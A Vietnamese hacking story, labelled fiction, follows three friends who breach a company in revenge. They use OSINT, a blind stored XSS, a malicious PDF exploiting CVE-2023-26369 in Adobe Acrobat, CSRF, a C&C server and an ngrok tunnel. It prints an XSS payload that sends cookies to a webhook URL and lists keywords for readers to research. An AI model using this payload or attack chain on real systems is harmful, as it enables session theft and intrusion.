# Tôi đã chiếm quyền điều hành cả một hệ thống mạng của một công ty X như thế nào.

## Lưu ý mọi nội dung dưới đây chỉ là hư cấu !

Bài viết sẽ đi xây dựng các lối tấn công thực tế các con đường khai thác APT.
Các kỹ thuật lỗ hổng sẽ được in đậm để các bạn có thể research.
cre: VHAE và những giấc mơ ;D

# Chương 1: Mở bài

### Phần 1: Bi kịch bắt đầu.

Chuyện bắt đầu cách đây 1 năm khi tôi là Vũ với công việc là phân tích mã độc. Bi kịch ập đến tôi ngay sau ngày sinh nhật tôi, bố tôi và mẹ tôi đều bị mất việc ở công ty X, công ty đó đã giải thích là do thu nhỏ quy mô kinh doanh nên phải cắt bớt nhân sự. Đêm đó tôi hơi buồn và ngồi research về công ty X và thấy công ty đó vẫn đang trong quá trình phát triển và quy mô cũng lớn nhưng lại chấm dứt hợp đồng với gia đình tôi, tôi dành ra nhiều ngày để nghiên cứu thì phát hiện ra sự thật là do bố mẹ tôi đã biết điều gì đó bí ẩn ở công ty và họ đã sa thải cả hai để giữ bí mật đó. Ngày đó tôi đã thực sự khó hiểu và bắt đầu đi tìm sự thật.

### Phần 2: Bắt tay hành động.

Câu truyện bắt đầu khi tôi liên hệ lại với 2 người bạn ở trường cũ là Hoàng ( Chuyên gia bảo mật website ) và Anh ( Một blackhat ) chúng tôi bắt đầu cuộc tấn công với công ty X và đặt tên nhóm là XTAE.

X - eXploit 
T - Technology 
A - Access 
E - Ethically

st1 : Chúng tôi đã bắt đầu tìm kiếm các thông tin về công ty X bao gồm nhân viên, quản lý, tổng giám đốc, hồ sơ tài chính và các báo cáo liên quan....

st2 : Sau khi đã có thông tin base chúng tôi bắt đầu rà quét thu thập các địa chỉ ip port, web và subdomain tại nhiều nơi như Shodan...

st3 : Chúng tôi phân công nhau tìm kiếm các lỗ hổng trên các thông tin thu thập được hầu hết chỉ là các lỗi dos và client.

Đã 3 ngày trôi qua và webhook của Vũ đã trả về dữ liệu về lỗ hổng XSS của một trang web tuyển dụng của công ty X.

![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/044db157-83fc-4213-a7c2-a8d532b33fda)



### Phần 3: Manh mối đầu tiên.

Với dữ liệu đổ về từ XSS Hoàng đã chuẩn đoán đây là lỗ hổng blind stored xss với 

payload xss ban đầu của Vũ  : 
```
'"><img src=x onerror='window.location.replace("https://webhook.site/0634543a?data="+document.cookie)'>
```

![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/43e2b79e-58a0-4129-9919-2752f7ffc7a7)

Với dữ liệu đồ về có lẽ ta đã thấy cookie của người dùng, chúng tôi nhanh chóng tiến hành thêm mã cookie xác thực vào trình duyệt để truy cập vào tài khoản kiểm duyệt đó nhưng không có gì xảy ra.
Tại sao ? đó là một câu nói xảy ra trong đầu 3 chúng tôi, liệu có phải các dữ liệu xác thực đã được đính `cờ httponly` ? 

Không trước đó Vũ đã kiểm tra trang web và nó xác thực người dùng qua TOKEN và không có cờ `httponly` vậy tại sao chúng tôi không truy cập được tài khoản đó qua cookie đã thu thập được.

Để làm rõ việc này Hoàng đã xây dựng lại mã khai thác xss để chúng tôi có thể thu thập được nhiều thông tin hơn ngoài việc thu thập cookie bằng document.cookie Hoàng đã thêm một vài trường vào payload cũ của Vũ

```
document.documentElement.outerHTML để thu thập toàn hộ html trang web
window.location.href để thu thập url trang web đang truy cập
```

![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/2e8c8f00-d7dd-421e-afa4-058a4665a40c)


Sau khi dữ liệu được trả về chúng tôi đã biết nguyên nhân từ url 172.50.24.21 là một ip private vậy chúng tôi đoán trang web tuyendung.congtyx.com sẽ nhận dữ liệu về một máy chủ và các nhân sự sẽ truy cập vào một webserver nội bộ qua mạng công ty hoặc vpn để duyệt hồ sơ các thành viên. Từ đó cũng lý giải vi sao chúng thôi sử dụng cookie đã thu thập được vào trang web tuyển dụng không được vì 2 trang web có chức năng xác thực khác nhau - Điều này thực sự thú vị vì nó sẽ làm tăng tính bảo mật của website và tránh để lộ thông tin ra bên ngoài môi trường internet cơ bản sơ đồ sẽ như sau.

![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/fb863d78-e281-4454-ab57-44959f0b9512)

Vậy không có quyền truy cập vào private vậy thì chúng tôi lấy thêm được dữ liệu gì từ lỗ hổng này. Kiểm tra mã html thu thập được chúng tôi biết các ứng viên sẽ nộp hồ sơ dạng pdf và nếu được duyệt hồ sơ sẽ được gửi lên cấp trên điều đặc biệt là các đường dẫn này ko preview mà sẽ tải thẳng về máy cá nhân và xem trên đó( tôi đã thử các lỗ hổng File upload vulnerabilities nhưng server chỉ cho lưu file pdf và lưu trong cdn) .Ý tưởng ban đầu của chúng tôi sẽ ghi đè mã html khi nhân sự tải xuống file pdf của tôi thay vì đó là pdf trên webserver thì đó là mội loại virut tôi cài cắm vào, tôi phân chia cho Anh thiết kế `máy chủ c&c` để quản lý các PC mà chúng tôi đã takeover.

1 ngày, 2 ngày, 1 tuần, 2 tuần vẫn chưa thấy phải hồi gì chúng tôi đã có rất nhiều câu hỏi: 

Liệu nhân sự đó không mở file pdf virut của tôi ? 

Các máy tính đã có diệt virut mới và xoá file của tôi ?

Code của tôi không hoạt động ?

Máy chủ cá nhân không cho phép tải các file khác ? 


Trong nhiều ngày chúng tôi đã osint nhiều thông tin về công ty và biết rất nhiều người dùng Adobe Acrobat tôi liền liên hệ cho Anh để tìm hiểu thêm về các lỗ hổng zeroday về một phần mềm này với một dân ngầm như Anh đã cho tôi ngay POC mới nhất về `CVE-2023-26369` tôi tiến hành xây dựng mã khai thác theo cve mà Anh cung cấp cùng lúc đó Hoàng kết hợp lỗi `XSS và CSRF` để tự tiến hành tự động xác nhận kiểm duyệt hồ sơ của tôi lên cấp trên để có thể lây lan được nhiều ngừoi hơn.


### Phần 3: Tia sáng cuối con đường:

Sau nhiều ngày chúng tôi đã thử nhiều cách và bùm có một pc kết nối đến chúng tôi và có chính là nhân viên thungoc.

Chúng tôi tiến hành xây dựng một proxy ngrok cho phép chúng tôi truy cập trang web nội bộ ngoài internet và phân công nhiệm vụ Hoàng sẽ tiến hành tìm kiếm thêm các lỗ hổng trong web nội bộ, tôi và Anh sẽ thực hiện rà soát các dải mạng private và tìm cách khai thác chúng....

![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/2806ebd9-f64a-4dbf-aa0e-2c873ab0b52b)


hết chương 1:
các keyword : 
- CVE-2023-26369
- XSS 
- CSRF
- Máy chủ c&c
- Ngrok proxy
- osint
- shodan
- File upload vulnerabilities
- cdn
- httponly cookie

Nếu các bạn thích về chủ đề này hay thì mình sẽ làm típ hehe ;()

Bài viết sẽ có nhiều lỗi sai và nhiều chi tiết thiếu sót bạn hãy góp ý bằng cách cmt phía dưới cảm ơn bạn.
